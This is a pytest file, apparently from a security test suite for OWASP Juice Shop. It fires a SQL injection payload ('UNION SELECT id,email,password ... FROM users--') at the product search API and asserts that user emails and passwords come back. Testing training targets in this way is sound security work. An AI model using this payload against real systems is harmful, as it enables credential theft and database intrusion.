import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
import requests
import re


@pytest.mark.api
def test_ct06_user_credentials(api_headers, config):
    base_url = config['url'].replace('http://localhost:3000', 'https://juice-shop.herokuapp.com')
    url = f"{base_url}/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--"
    response = requests.get(url, headers=api_headers)
    assert response.status_code == config['status']
    
    url = f"{base_url}/rest/products/search?q=M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--"
    response = requests.get(url, headers=api_headers)
    assert response.status_code == config['status']
    
    json_response = response.json()
    
    assert 'data' in json_response, "No 'data' in response"
    
    found = []
    email_pattern = re.compile(r'^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$', re.IGNORECASE)
    
    for item in json_response['data']:
        name = item.get('name', '')
        if email_pattern.match(name):
            found.append(f"{name} - {item.get('description', '')}")
    
    assert len(found) > 0, "No credentials found"


if __name__ == "__main__":
    import os
    os.chdir(Path(__file__).parent.parent)
    pytest.main([__file__, "-v"])
